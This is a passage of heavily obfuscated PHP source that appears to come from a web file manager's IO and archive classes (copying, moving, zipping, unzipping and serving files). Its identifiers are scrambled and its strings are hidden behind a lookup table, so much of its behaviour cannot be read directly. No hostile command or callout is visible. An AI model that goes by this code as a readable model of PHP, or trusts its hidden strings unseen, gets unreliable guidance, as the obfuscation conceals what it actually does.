$ûû’Ïƒ->getPathOuter($èøä¢Õ«); } if (method_exists($ûû’Ïƒ, $‘åşĞÙÖ)) { return $ûû’Ïƒ->{$‘åşĞÙÖ}($èøä¢Õ«, $ê¥›€ğè, $ÀÅÍ”ı™, $“öÇÈì); } } if ($å¶¶û¶ø && $‘åşĞÙÖ == $áÂşªŞ[629] && $ûû’Ïƒ->getType() == $áÂşªŞ[109]) { $‘û¼ñåÔ = $ûû’Ïƒ->movePath($èøä¢Õ«, $ê¥›€ğè, $“öÇÈì); if ($‘û¼ñåÔ) { return $‘û¼ñåÔ; } } $„¢¥üÚà = $íÕ¤÷°->isFile($èøä¢Õ«); if (!$„¢¥üÚà && $ûû’Ïƒ->getType() == $áÂşªŞ[837] && $íÕ¤÷°->getType() == $áÂşªŞ[109]) { $‘û¼ñåÔ = $ûû’Ïƒ->copyFolderFromIO($íÕ¤÷°, $èøä¢Õ«, $ê¥›€ğè, $ÀÅÍ”ı™, $ö“½¨ü³, $“öÇÈì); } else { $‘û¼ñåÔ = self::copyPath($íÕ¤÷°, $èøä¢Õ«, $ûû’Ïƒ, $ê¥›€ğè, $ÀÅÍ”ı™, $ö“½¨ü³, $„¢¥üÚà, $“öÇÈì); } if ($‘û¼ñåÔ && $ö“½¨ü³) { $íÕ¤÷°->remove($èøä¢Õ«); } if ($§Ó×½¹È) { $‘û¼ñåÔ = $§Ó×½¹È->getPathOuter($‘û¼ñåÔ); } return $‘û¼ñåÔ; } private static function check($ŸœĞùÑ¢, $š¾¤¬İÆ, $çÓá³Ÿğ, &$»É°±·‹) { $Û°ÜÍ“ =& $_SERVER[ç¦¬”œš]; if (self::driverIsSame($ŸœĞùÑ¢, $çÓá³Ÿğ) && $ŸœĞùÑ¢->isFolder($š¾¤¬İÆ) && $ŸœĞùÑ¢->isParentOf($š¾¤¬İÆ, $»É°±·‹)) { show_json(LNG($Û°ÜÍ“[1236]), !1); } if (!$ŸœĞùÑ¢->exist($š¾¤¬İÆ)) { show_json(LNG($Û°ÜÍ“[108]), !1); } } private static function copyPath($â’ñ™Ú, $ïõ«İ²›, $ú´©ûÂù, $—ñÚú•, $¢ç½­¸û, $Êáßê, $†Óı‚ Ì, $Ï»®–…‹ = false, $³±á¥Ó³ = true) { $…€²¹Ò• =& $_SERVER[ç¦¬”œš]; $¤¿Ø·ÉŒ = empty($Ï»®–…‹) && $Ï»®–…‹ !== $…€²¹Ò•[228] ? $â’ñ™Ú->pathThis($ïõ«İ²›) : $Ï»®–…‹; if ($¢ç½­¸û) { $ğÄğ´ı‘ = $ú´©ûÂù->fileNameExist($—ñÚú•, $¤¿Ø·ÉŒ); $³Ë†âÊ¼ = $¤¿Ø·ÉŒ; $¤¿Ø·ÉŒ = $ú´©ûÂù->fileNameAuto($—ñÚú•, $¤¿Ø·ÉŒ, $¢ç½­¸û, !$†Óı‚ Ì); if (!$ğÄğ´ı‘ || $³Ë†âÊ¼ != $¤¿Ø·ÉŒ) { $¢ç½­¸û = !1; } if ($³±á¥Ó³ && !$¢ç½­¸û) { $ú´©ûÂù->_data[$…€²¹Ò•[1237]] = !0; } } if ($†Óı‚ Ì) { return self::copyFile($â’ñ™Ú, $ïõ«İ²›, $ú´©ûÂù, $—ñÚú•, $¤¿Ø·ÉŒ, $Êáßê); } if ($¢ç½­¸û == REPEAT_RENAME_FOLDER) { $¢ç½­¸û = !1; } $äıÂµ» = rtrim($—ñÚú•, $…€²¹Ò•[8]) . $…€²¹Ò•[8] . $¤¿Ø·ÉŒ; $²äĞÓ = $ú´©ûÂù->mkdir($ú´©ûÂù->getPath($äıÂµ»), $¢ç½­¸û); $—ñÚú• = $ú´©ûÂù->getPathInner($²äĞÓ); $¼Ëˆò®Ñ = $â’ñ™Ú->listPath($ïõ«İ²›, !0); $¼Ëˆò®Ñ = is_array($¼Ëˆò®Ñ) ? $¼Ëˆò®Ñ : array($…€²¹Ò•[86] => array(), $…€²¹Ò•[85] => array()); $Ø†ƒ¸ = array_merge($¼Ëˆò®Ñ[$…€²¹Ò•[86]], $¼Ëˆò®Ñ[$…€²¹Ò•[85]]); foreach ($Ø†ƒ¸ as $ü‘‰™µ) { $‹³İŠ¦Ú = $ü‘‰™µ[$…€²¹Ò•[33]] == $…€²¹Ò•[230]; $ïõ«İ²› = $â’ñ™Ú->getPathInner($ü‘‰™µ[$…€²¹Ò•[87]]); $ŞÇ‘¢¹ = self::copyPath($â’ñ™Ú, $ïõ«İ²›, $ú´©ûÂù, $—ñÚú•, $¢ç½­¸û, $Êáßê, $‹³İŠ¦Ú, !1, !1); if (!$ŞÇ‘¢¹) { IO::errorTips($…€²¹Ò•[1238] . $ïõ«İ²› . $…€²¹Ò•[73] . $—ñÚú•); } } self::copyMoveKeepInfo($â’ñ™Ú, $ïõ«İ²›, $²äĞÓ); return $²äĞÓ; } private static function copyFile($ø—ÒĞ, $óªÄ‰¡¬, $ª†øßèó, $æ†ûÊ¿ê, $¯²ı…‘Ä, $‡ÁŞ´’) { $šˆğÃÕ¶ =& $_SERVER[ç¦¬”œš]; $æ†ûÊ¿ê = $ª†øßèó->getPath(rtrim($æ†ûÊ¿ê, $šˆğÃÕ¶[8]) . $šˆğÃÕ¶[8] . $¯²ı…‘Ä); $ñòÑÑšó = $šˆğÃÕ¶[1239] . time() . rand_string(5); Hook::trigger($šˆğÃÕ¶[1240], $ø—ÒĞ, $óªÄ‰¡¬, $ª†øßèó, $æ†ûÊ¿ê, $¯²ı…‘Ä, $ñòÑÑšó); if (self::driverIsSame($ø—ÒĞ, $ª†øßèó)) { if ($‡ÁŞ´’) { $éŠÆè™§ = $ª†øßèó->moveFile($óªÄ‰¡¬, $æ†ûÊ¿ê); } else { $éŠÆè™§ = $ª†øßèó->copyFile($óªÄ‰¡¬, $æ†ûÊ¿ê); } Hook::trigger($šˆğÃÕ¶[1241], $ø—ÒĞ, $óªÄ‰¡¬, $ª†øßèó, $æ†ûÊ¿ê, $¯²ı…‘Ä, $éŠÆè™§); self::copyMoveKeepInfo($ø—ÒĞ, $óªÄ‰¡¬, $éŠÆè™§); return $éŠÆè™§; } $•¡¹ğ¶õ = TEMP_FILES; if ($GLOBALS[$šˆğÃÕ¶[6]][$šˆğÃÕ¶[92]][$šˆğÃÕ¶[876]]) { $•¡¹ğ¶õ = $GLOBALS[$šˆğÃÕ¶[6]][$šˆğÃÕ¶[92]][$šˆğÃÕ¶[876]]; } $ÂšÌ¸Í = $•¡¹ğ¶õ; mk_dir($ÂšÌ¸Í); $ä†½Ò”‡ = $ÂšÌ¸Í . $ñòÑÑšó; $ïŠ„¢ Ä = $ä†½Ò”‡; $ä†½Ò”‡ = $ø—ÒĞ->download($óªÄ‰¡¬, $ä†½Ò”‡); $ä†½Ò”‡ = $ø—ÒĞ->iconvApp($ä†½Ò”‡); if (substr($ä†½Ò”‡, strlen($•¡¹ğ¶õ)) == $•¡¹ğ¶õ) { $‡ÁŞ´’ = !0; } $éŠÆè™§ = $ª†øßèó->upload($æ†ûÊ¿ê, $ä†½Ò”‡, $‡ÁŞ´’); self::remove($ïŠ„¢ Ä); Hook::trigger($šˆğÃÕ¶[1241], $ø—ÒĞ, $óªÄ‰¡¬, $ª†øßèó, $æ†ûÊ¿ê, $¯²ı…‘Ä, $éŠÆè™§); self::copyMoveKeepInfo($ø—ÒĞ, $óªÄ‰¡¬, $éŠÆè™§); return $éŠÆè™§; } private static function copyMoveKeepInfo($ÛøŸ·µ, $˜Â¥¢å, $ŠÊµ‹²Í) { if (!$ŠÊµ‹²Í) { return; } $ğ½±¤ ‚ = $ÛøŸ·µ->info($˜Â¥¢å); if (!is_array($ğ½±¤ ‚)) { return; } IO::setModifyTime($ŠÊµ‹²Í, $ğ½±¤ ‚[$_SERVER[ç¦¬”œš][88]]); } public static function pathFather($Õ¦İÊˆ) { $ÀùöØ•ã = IO::init($Õ¦İÊˆ); $êşæ¾Àâ = $ÀùöØ•ã->pathFather($ÀùöØ•ã->path); return $ÀùöØ•ã->getPathOuter($êşæ¾Àâ); } public static function fileOut($ö¬ê±ˆİ, $ã¸‚ë›÷ = false, $ì¨¾ø = false, $œ„ ÆÛµ = '') { $¿À¢ç•½ = self::driverMake($ö¬ê±ˆİ); if ($¿À¢ç•½->isFileOutServer()) { return $¿À¢ç•½->fileOutServer($ö¬ê±ˆİ, $ã¸‚ë›÷, $ì¨¾ø, $œ„ ÆÛµ); } return $¿À¢ç•½->fileOut($ö¬ê±ˆİ, $ã¸‚ë›÷, $ì¨¾ø, $œ„ ÆÛµ); } public static function fileOutImage($ñãöÔ¾İ, $ˆ¢â£Ïï = 250) { $Ñ…ãñÕ¬ = array(250, 600, 1200, 2000, 3000, 5000); for ($ò’³ı…¹ = 0; $ò’³ı…¹ < count($Ñ…ãñÕ¬); $ò’³ı…¹++) { if ($ò’³ı…¹ == 0 && $ˆ¢â£Ïï <= $Ñ…ãñÕ¬[$ò’³ı…¹]) { $ˆ¢â£Ïï = $Ñ…ãñÕ¬[$ò’³ı…¹]; break; } else { if ($ˆ¢â£Ïï > $Ñ…ãñÕ¬[$ò’³ı…¹ - 1] && $ˆ¢â£Ïï <= $Ñ…ãñÕ¬[$ò’³ı…¹]) { $ˆ¢â£Ïï = $Ñ…ãñÕ¬[$ò’³ı…¹]; break; } else { if ($ò’³ı…¹ == count($Ñ…ãñÕ¬) - 1 && $ˆ¢â£Ïï > $Ñ…ãñÕ¬[$ò’³ı…¹]) { $ˆ¢â£Ïï = $Ñ…ãñÕ¬[$ò’³ı…¹]; break; } } } } $ÏãÄ“² = self::driverMake($ñãöÔ¾İ); if ($ÏãÄ“²->isFileOutServer()) { return $ÏãÄ“²->fileOutImageServer($ñãöÔ¾İ, $ˆ¢â£Ïï); } return $ÏãÄ“²->fileOutImage($ñãöÔ¾İ, $ˆ¢â£Ïï); } private static function driverIsSame($¥¼ñë•…, $£Ó†¾éà) { $Ö¢òñ¡ =& $_SERVER[ç¦¬”œš]; $¦¦ó¹€ = $¥¼ñë•…->getType(); $Î™î†à = $£Ó†¾éà->getType(); if ($¦¦ó¹€ != $Î™î†à) { return !1; } if ($¦¦ó¹€ == $Ö¢òñ¡[837]) { return !0; } if ($¦¦ó¹€ == $Ö¢òñ¡[109]) { return !0; } if ($¥¼ñë•…->pathDriver == $£Ó†¾éà->pathDriver) { return !0; } return !1; } public static function copyUpdate($‘’ê–²Ë, $²Öƒ¯á¦) { $õ®Ñù¨Ó =& $_SERVER[ç¦¬”œš]; if (!IO::exist($‘’ê–²Ë)) { return !1; } if (!IO::exist($²Öƒ¯á¦)) { IO::mkdir($²Öƒ¯á¦); } $†‚ÑşÃ = array_to_keyvalue(self::listAllSimple($‘’ê–²Ë), $õ®Ñù¨Ó[87]); $Ì×§ÍÇ = array_to_keyvalue(self::listAllSimple($²Öƒ¯á¦), $õ®Ñù¨Ó[87]); $ê’öÃÂÕ = array(); $âí‚î—ø = array(); foreach ($†‚ÑşÃ as $ïÀ½œâÖ => $Ü—ÁŒ¯) { if (isset($Ì×§ÍÇ[$ïÀ½œâÖ])) { if ($Ü—ÁŒ¯[$õ®Ñù¨Ó[78]] == 1) { continue; } if ($Ì×§ÍÇ[$ïÀ½œâÖ][$õ®Ñù¨Ó[79]] == $Ü—ÁŒ¯[$õ®Ñù¨Ó[79]]) { continue; } } if ($Ü—ÁŒ¯[$õ®Ñù¨Ó[78]] == 1) { $âí‚î—ø[] = $²Öƒ¯á¦ . $õ®Ñù¨Ó[8] . trim($ïÀ½œâÖ, $õ®Ñù¨Ó[8]); continue; } $ÔÔƒ¶Œ = strstr(trim($ïÀ½œâÖ, $õ®Ñù¨Ó[8]), $õ®Ñù¨Ó[8]) ? get_path_father($ïÀ½œâÖ) : $õ®Ñù¨Ó[12]; $ê’öÃÂÕ[] = array($õ®Ñù¨Ó[1242] => $Ü—ÁŒ¯[$õ®Ñù¨Ó[89]], $õ®Ñù¨Ó[1243] => rtrim($²Öƒ¯á¦, $õ®Ñù¨Ó[8]) . $õ®Ñù¨Ó[8] . $ÔÔƒ¶Œ, $õ®Ñù¨Ó[1244] => $Ü—ÁŒ¯); } $¾”¡¬¸· = array($õ®Ñù¨Ó[230] => $ê’öÃÂÕ, $õ®Ñù¨Ó[78] => $âí‚î—ø); Hook::trigger($õ®Ñù¨Ó[1245], $‘’ê–²Ë, $²Öƒ¯á¦, $¾”¡¬¸·); foreach ($âí‚î—ø as $Ü—ÁŒ¯) { IO::mkdir($Ü—ÁŒ¯); } foreach ($ê’öÃÂÕ as $Ü—ÁŒ¯) { IO::copy($Ü—ÁŒ¯[$õ®Ñù¨Ó[1242]], $Ü—ÁŒ¯[$õ®Ñù¨Ó[1243]], REPEAT_REPLACE); } } public static function fileSubstr($øŒé—µØ, $¤¡àÚê¤, $½àĞ°ª = false) { $´Ñå ÷È =& $_SERVER[ç¦¬”œš]; $“úÉæ–‰ = self::driverMake($øŒé—µØ); $Œææı‡Á = $“úÉæ–‰->size($øŒé—µØ); $‡©Œ¹Åˆ = $¤¡àÚê¤; $ÛÅ¼úŠ© = $½àĞ°ª; if ($¤¡àÚê¤ < 0) { $¤¡àÚê¤ = $Œææı‡Á + $¤¡àÚê¤; } if ($½àĞ°ª === !1) { $½àĞ°ª = $Œææı‡Á - $¤¡àÚê¤; } if ($¤¡àÚê¤ + $½àĞ°ª > $Œææı‡Á) { $½àĞ°ª = $Œææı‡Á - $¤¡àÚê¤; } if (!$Œææı‡Á && $“úÉæ–‰->getType() == $´Ñå ÷È[109] && !$“úÉæ–‰->exist($øŒé—µØ)) { $àö÷´¹ı = get_path_this($øŒé—µØ); $ÃÈÇÕû¾ = parse_url_query($àö÷´¹ı); if (is_array($ÃÈÇÕû¾) && isset($ÃÈÇÕû¾[$´Ñå ÷È[32]])) { $àö÷´¹ı = urldecode($ÃÈÇÕû¾[$´Ñå ÷È[32]]); } throw new Exception($´Ñå ÷È[1246] . LNG($´Ñå ÷È[1247]) . $´Ñå ÷È[1045] . clear_html($àö÷´¹ı) . $´Ñå ÷È[12]); } if ($½àĞ°ª <= 0) { return $´Ñå ÷È[12]; } if ($¤¡àÚê¤ < 0 || $¤¡àÚê¤ >= $Œææı‡Á || $½àĞ°ª > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\145\122\145\141\x64\40\x65\162\x72\x6f\x72\x21\40\x73\x74\141\x72\x74\75{$¤¡àÚê¤}\x3b\x6c\145\156\147\x74\150\75{$½àĞ°ª}\73\40\163\x69\x7a\x65\x3d{$Œææı‡Á}\73"); } $¡ŒŞ¡ˆÇ = $“úÉæ–‰->fileSubstr($øŒé—µØ, $¤¡àÚê¤, $½àĞ°ª); if (!$¡ŒŞ¡ˆÇ && $½àĞ°ª && isset($GLOBALS[$´Ñå ÷È[1248]])) { throw new Exception($GLOBALS[$´Ñå ÷È[1248]][$´Ñå ÷È[1249]]); } return $¡ŒŞ¡ˆÇ; } private static function driverMake(&$ô¾¢Ú’Ñ) { $ôÚ‹çü =& $_SERVER[ç¦¬”œš]; $»¢ØŒ–£ = KodIO::parse($ô¾¢Ú’Ñ); if (!self::$driverListSystem) { $çâ¥ßš = Model($ôÚ‹çü[847])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($çâ¥ßš, $ôÚ‹çü[484]); } if ($»¢ØŒ–£[$ôÚ‹çü[33]] == KodIO::KOD_IO && !self::$driverListSystem[$»¢ØŒ–£[$ôÚ‹çü[484]]]) { throw new Exception($ôÚ‹çü[1250]); return !1; } $ô¾¢Ú’Ñ = $»¢ØŒ–£[$ôÚ‹çü[1251]]; $Ÿôü¦  = self::driverGet($»¢ØŒ–£, $ô¾¢Ú’Ñ); return $Ÿôü¦ ; } private static function driverGet($üí´Äˆ£, &$”€ãÊË‚) { $™³×—àø =& $_SERVER[ç¦¬”œš]; $µ¢ÒÂÔÏ = $üí´Äˆ£[$™³×—àø[1252]]; $“ªƒÉ = $üí´Äˆ£[$™³×—àø[484]]; switch ($üí´Äˆ£[$™³×—àø[33]]) { case KodIO::KOD_IO: $÷ûï¢”® = self::$driverListSystem[$“ªƒÉ]; break; case KodIO::KOD_SOURCE: $”€ãÊË‚ = $“ªƒÉ . $”€ãÊË‚; $÷ûï¢”® = array($™³×—àø[1253] => $™³×—àø[1254], $™³×—àø[6] => $üí´Äˆ£); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Âƒ©”äœ = $GLOBALS[$™³×—àø[1255]]; self::$driverListUser = array_to_keyvalue($Âƒ©”äœ, $™³×—àø[484]); } $÷ûï¢”® = self::$driverListUser[$“ªƒÉ]; break; case KodIO::KOD_SHARE_LINK: $÷ûï¢”® = array($™³×—àø[1253] => $™³×—àø[1256], $™³×—àø[6] => $üí´Äˆ£); $úó•ŒâÂ = Action($™³×—àø[1257])->sharePathInfo($üí´Äˆ£[$™³×—àø[87]]); $”€ãÊË‚ = $úó•ŒâÂ[$™³×—àø[193]]; if (!$úó•ŒâÂ[$™³×—àø[193]]) { $¸ÚÀêë’ = Model($™³×—àø[673])->getInfo($úó•ŒâÂ[$™³×—àø[674]]); $”€ãÊË‚ = KodIO::clear($¸ÚÀêë’[$™³×—àø[1258]] . $üí´Äˆ£[$™³×—àø[1251]]); $üí´Äˆ£[$™³×—àø[569]] = $¸ÚÀêë’; $üí´Äˆ£[$™³×—àø[1233]] = $”€ãÊË‚; $÷ûï¢”® = array($™³×—àø[1253] => $™³×—àø[1259], $™³×—àø[6] => $üí´Äˆ£); } break; case KodIO::KOD_SHARE_ITEM: $÷ûï¢”® = array($™³×—àø[1253] => $™³×—àø[1260], $™³×—àø[6] => $üí´Äˆ£); $¸ÚÀêë’ = Model($™³×—àø[673])->getInfo($üí´Äˆ£[$™³×—àø[484]]); if ($¸ÚÀêë’[$™³×—àø[193]] == $™³×—àø[228]) { $”€ãÊË‚ = KodIO::clear($¸ÚÀêë’[$™³×—àø[1258]] . $üí´Äˆ£[$™³×—àø[1251]]); $üí´Äˆ£[$™³×—àø[569]] = $¸ÚÀêë’; $üí´Äˆ£[$™³×—àø[1233]] = $”€ãÊË‚; $÷ûï¢”® = array($™³×—àø[1253] => $™³×—àø[1261], $™³×—àø[6] => $üí´Äˆ£); } else { if (!$”€ãÊË‚) { $”€ãÊË‚ = $¸ÚÀêë’[$™³×—àø[193]]; } } break; default: $”€ãÊË‚ = $üí´Äˆ£[$™³×—àø[87]]; $÷ûï¢”® = array($™³×—àø[1253] => $™³×—àø[1262]); break; } $…àÇŸÚÛ = $üí´Äˆ£[$™³×—àø[87]]; if (!isset(self::$driverCache[$…àÇŸÚÛ])) { $ËÎİ˜Òº = strtolower($÷ûï¢”®[$™³×—àø[98]]); $Ô¤êŸãë = $GLOBALS[$™³×—àø[6]][$™³×—àø[92]][$™³×—àø[905]]; $¸˜»ıª = $™³×—àø[77] . (isset($Ô¤êŸãë[$ËÎİ˜Òº]) ? $Ô¤êŸãë[$ËÎİ˜Òº] : ucfirst($ËÎİ˜Òº)); if (!class_exists($¸˜»ıª)) { show_json("{$¸˜»ıª}\40\156\157\164\40\x65\170\x69\x73\x74\x73\41", !1); } $ÊÎô¨˜‡ = isset($÷ûï¢”®[$™³×—àø[6]]) ? $÷ûï¢”®[$™³×—àø[6]] : !1; self::$driverCache[$…àÇŸÚÛ] = new $¸˜»ıª($ÊÎô¨˜‡); } $šÁŒÔÃ = self::$driverCache[$…àÇŸÚÛ]; $šÁŒÔÃ->pathDriver = $µ¢ÒÂÔÏ; $šÁŒÔÃ->pathBase = $™³×—àø[12]; if (isset($÷ûï¢”®[$™³×—àø[6]][$™³×—àø[1263]])) { $šÁŒÔÃ->pathBase = rtrim($÷ûï¢”®[$™³×—àø[6]][$™³×—àø[1263]], $™³×—àø[8]) . $™³×—àø[8]; $”€ãÊË‚ = $šÁŒÔÃ->pathBase . ltrim($”€ãÊË‚, $™³×—àø[8]); } $”€ãÊË‚ = $šÁŒÔÃ->getPath($”€ãÊË‚); if (isset($üí´Äˆ£[$™³×—àø[1233]])) { $”€ãÊË‚ = $üí´Äˆ£[$™³×—àø[1233]]; } $šÁŒÔÃ->path = $”€ãÊË‚; return $šÁŒÔÃ; } public static function errorTips($îÇ‘¼ŠŠ = false) { $ÁÄñ«ºæ =& $_SERVER[ç¦¬”œš]; static $É°¯¬ÄÖ = array(); $ÆÏûîıÜ = 1000; if ($îÇ‘¼ŠŠ === -1) { return $É°¯¬ÄÖ ? $É°¯¬ÄÖ[count($É°¯¬ÄÖ) - 1] : $ÁÄñ«ºæ[12]; } if ($îÇ‘¼ŠŠ === !1) { return implode($ÁÄñ«ºæ[262], $É°¯¬ÄÖ); } if (count($É°¯¬ÄÖ) >= $ÆÏûîıÜ) { $É°¯¬ÄÖ = array_slice($É°¯¬ÄÖ, $ÆÏûîıÜ * 0.5, $ÆÏûîıÜ); } $É°¯¬ÄÖ[] = $îÇ‘¼ŠŠ; write_log($ÁÄñ«ºæ[176] . ACTION . $ÁÄñ«ºæ[1264] . $îÇ‘¼ŠŠ, $ÁÄñ«ºæ[1265]); } public static function getLastError($­üÀğœŒ = '') { $ìŸü’ã£ = self::errorTips(-1); return $ìŸü’ã£ ? $ìŸü’ã£ : $­üÀğœŒ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $é„ÀÄÒ; if ($é„ÀÄÒ) { return $é„ÀÄÒ; } $«ÎÄ«Ÿ = IO::init($_SERVER[ç¦¬”œš][8]); return $«ÎÄ«Ÿ; } private static function iconvSystem($¼Û¯Ğæ) { return self::local()->iconvSystem($¼Û¯Ğæ); } private static function iconvApp($¬Îñé®ƒ) { return self::local()->iconvApp($¬Îñé®ƒ); } public static function zipFolder($¹Å¯¨ø, $õ—ÁğøØ = "\172\x69\x70", $º€¶Ù£Ÿ = '', $ˆˆ§ÇÙ = REPEAT_RENAME) { $à—¥Ô“ =& $_SERVER[ç¦¬”œš]; $šş¸Èı™ = IO::listPath($¹Å¯¨ø); if (!$šş¸Èı™) { return !1; } $šş¸Èı™ = array_merge($šş¸Èı™[$à—¥Ô“[85]], $šş¸Èı™[$à—¥Ô“[86]]); return self::zip($šş¸Èı™, $õ—ÁğøØ, $º€¶Ù£Ÿ, $ˆˆ§ÇÙ); } public static function zip($³§§èÑŒ, $¹´’¤Ô‹ = "\x7a\151\x70", $©Èäö¹ = '', $®®áô±ê = REPEAT_RENAME) { $è“•£™ =& $_SERVER[ç¦¬”œš]; if (is_string($³§§èÑŒ) && $³§§èÑŒ) { $³§§èÑŒ = array(array($è“•£™[87] => $³§§èÑŒ)); } $¿“¥ã— = self::init($³§§èÑŒ[0][$è“•£™[87]]); $ğ†ãÛÕã = self::info($³§§èÑŒ[0][$è“•£™[87]]); $Ó›¹ü¤š = $è“•£™[12]; $›Ö­Øš® = $è“•£™[12]; $¿òòâü‘ = $è“•£™[12]; if ($©Èäö¹ && substr($©Èäö¹, -1, 1) != $è“•£™[8]) { $›Ö­Øš® = get_path_father($©Èäö¹); $¿òòâü‘ = get_path_this($©Èäö¹); } else { $›Ö­Øš® = self::pathFather($ğ†ãÛÕã[$è“•£™[87]]); $¿òòâü‘ = $ğ†ãÛÕã[$è“•£™[32]] . $è“•£™[10] . $¹´’¤Ô‹; if (count($³§§èÑŒ) > 1) { $Óë˜ÏÖ¤ = IO::info($›Ö­Øš®); $¿òòâü‘ = $Óë˜ÏÖ¤[$è“•£™[32]] . $è“•£™[10] . $¹´’¤Ô‹; } if ($©Èäö¹) { $›Ö­Øš® = $©Èäö¹; } } if ($¿“¥ã—->getType() == $è“•£™[109]) { $íñâäçù = self::init($›Ö­Øš®); $‰±¤ñÕ¬ = $íñâäçù->getType() == $è“•£™[109] ? $›Ö­Øš® : get_path_father($¿“¥ã—->path); $‰±¤ñÕ¬ = rtrim($‰±¤ñÕ¬, $è“•£™[8]) . $è“•£™[8]; mk_dir($‰±¤ñÕ¬); } else { $Ó›¹ü¤š = TEMP_FILES . $è“•£™[1266] . time() . rand_string(8) . $è“•£™[8]; mk_dir($Ó›¹ü¤š); file_put_contents($Ó›¹ü¤š . $è“•£™[1267], $è“•£™[12]); $‰±¤ñÕ¬ = $Ó›¹ü¤š; } $¥ş²øØ– = IO::info($‰±¤ñÕ¬); if (!$¥ş²øØ– || !$¥ş²øØ–[$è“•£™[233]]) { show_json(LNG($è“•£™[1268]), !1); } $ï¡™ù×¦ = self::zipFileList($³§§èÑŒ, $Ó›¹ü¤š); foreach ($ï¡™ù×¦ as $‹‘ó³ŒÍ => $Ò˜ª•·ì) { $ï¡™ù×¦[$‹‘ó³ŒÍ] = self::iconvSystem($Ò˜ª•·ì); } $‰½¨ú€Ğ = get_filename_auto($‰±¤ñÕ¬ . $¿òòâü‘, $è“•£™[12], $®®áô±ê); KodArchive::create(self::iconvSystem($‰½¨ú€Ğ), $ï¡™ù×¦); if (!IO::exist($‰½¨ú€Ğ)) { if ($Ó›¹ü¤š) { del_dir($Ó›¹ü¤š); } write_log($è“•£™[1269] . $‰½¨ú€Ğ, $è“•£™[389]); show_json(LNG($è“•£™[1270]), !1); } if (!$Ó›¹ü¤š) { return $‰½¨ú€Ğ; } $”¤Ñİş¬ = self::move($‰½¨ú€Ğ, $›Ö­Øš®, $®®áô±ê); if ($Ó›¹ü¤š) { del_dir($Ó›¹ü¤š); } if (!$‰½¨ú€Ğ) { write_log($è“•£™[1271] . $‰½¨ú€Ğ . $è“•£™[1272] . $›Ö­Øš®, $è“•£™[389]); show_json(LNG($è“•£™[1270]), !1); } return $”¤Ñİş¬; } public static function unzip($–Œ„›ßÆ, $åÁÑŞÑÀ, $İëÕ²üü = "\55\61", $ì¼¢€®¼ = "\x72\x65\x70\154\x61\x63\145") { $™êµòÎÜ =& $_SERVER[ç¦¬”œš]; $©°Õö…ª = parent::info($–Œ„›ßÆ); if (!$©°Õö…ª) { show_json(LNG($™êµòÎÜ[1273]), !1); } $œÚ¯ŸÀ€ = IO::infoFullSimple($åÁÑŞÑÀ); if (!$œÚ¯ŸÀ€) { $åÁÑŞÑÀ = IO::mkdir($åÁÑŞÑÀ); } if (isset($œÚ¯ŸÀ€[$™êµòÎÜ[193]]) && trim($œÚ¯ŸÀ€[$™êµòÎÜ[87]], $™êµòÎÜ[8]) != trim($åÁÑŞÑÀ, $™êµòÎÜ[8])) { $íŞŠşÓ« = KodIO::make($œÚ¯ŸÀ€[$™êµòÎÜ[192]]); $’åÛ×ù† = IO::fileNameAuto($íŞŠşÓ«, $œÚ¯ŸÀ€[$™êµòÎÜ[32]], REPEAT_RENAME_FOLDER, !0); $åÁÑŞÑÀ = IO::mkdir($íŞŠşÓ« . $’åÛ×ù†); } $İëÕ²üü = $İëÕ²üü && $İëÕ²üü != $™êµòÎÜ[1274] ? @json_decode($İëÕ²üü, !0) : -1; $œÛŞ¾ñï = self::unzipPart($–Œ„›ßÆ, $İëÕ²üü); if (!$œÛŞ¾ñï || !IO::exist($œÛŞ¾ñï[$™êµòÎÜ[230]])) { show_json(LNG($™êµòÎÜ[108]), !1); } $­‰üá‡İ = $œÛŞ¾ñï[$™êµòÎÜ[1275]][count($œÛŞ¾ñï[$™êµòÎÜ[1275]]) - 1]; if ($­‰üá‡İ[$™êµòÎÜ[1276]] == -1 || substr($­‰üá‡İ[$™êµòÎÜ[32]], -1, 1) == $™êµòÎÜ[8]) { $Í¢¿¥¥ = $œÛŞ¾ñï[$™êµòÎÜ[1277]] . rand_string(10) . $™êµòÎÜ[8]; mk_dir($Í¢¿¥¥); $Î÷İ»¹Œ = count($œÛŞ¾ñï[$™êµòÎÜ[1275]]) == 1 ? IO::ext($–Œ„›ßÆ) : get_path_ext($œÛŞ¾ñï[$™êµòÎÜ[230]]); $æª«È—­ = KodArchive::extract(self::iconvSystem($œÛŞ¾ñï[$™êµòÎÜ[230]]), $Í¢¿¥¥, $­‰üá‡İ[$™êµòÎÜ[1276]], $’åÛ×ù†, $Î÷İ»¹Œ); self::unzipErrorCheck($æª«È—­, array($™êµòÎÜ[1278], $–Œ„›ßÆ, $Î÷İ»¹Œ, $åÁÑŞÑÀ, $œÛŞ¾ñï)); Hook::trigger($™êµòÎÜ[1279], $Í¢¿¥¥); recursion_dir($Í¢¿¥¥, $§ëûäæ—, $ÌšƒÍ, 0); $™Ñú¦‰ = array_merge($§ëûäæ—, $ÌšƒÍ); $ïŒÂÅûß = array(); foreach ($™Ñú¦‰ as $ô“éÃºÛ) { $¾ÌŠÔ—¡ = IO::move(self::iconvApp($ô“éÃºÛ), $åÁÑŞÑÀ, $ì¼¢€®¼); if ($¾ÌŠÔ—¡) { $ïŒÂÅûß[] = $¾ÌŠÔ—¡; } } del_dir($Í¢¿¥¥); } else { $¾ÌŠÔ—¡ = IO::move($œÛŞ¾ñï[$™êµòÎÜ[230]], $åÁÑŞÑÀ, $ì¼¢€®¼, get_path_this($­‰üá‡İ[$™êµòÎÜ[32]])); if ($¾ÌŠÔ—¡) { $ïŒÂÅûß[] = $¾ÌŠÔ—¡; } } return $ïŒÂÅûß ? $ïŒÂÅûß : !1; } public static function unzipList($Ü¼ó†ê­) { $‡ğ™Æ³Ï =& $_SERVER[ç¦¬”œš]; $ÍÒŸµ­Û = isset($Ü¼ó†ê­[$‡ğ™Æ³Ï[1280]]) ? $Ü¼ó†ê­[$‡ğ™Æ³Ï[1280]] : !1; $ÒĞ†Î©¨ = isset($Ü¼ó†ê­[$‡ğ™Æ³Ï[1276]]) ? @json_decode($Ü¼ó†ê­[$‡ğ™Æ³Ï[1276]], !0) : -1; $Îß¸Ç®Ô = self::unzipPart($Ü¼ó†ê­[$‡ğ™Æ³Ï[87]], $ÒĞ†Î©¨); if (!$Îß¸Ç®Ô || !IO::exist($Îß¸Ç®Ô[$‡ğ™Æ³Ï[230]])) { 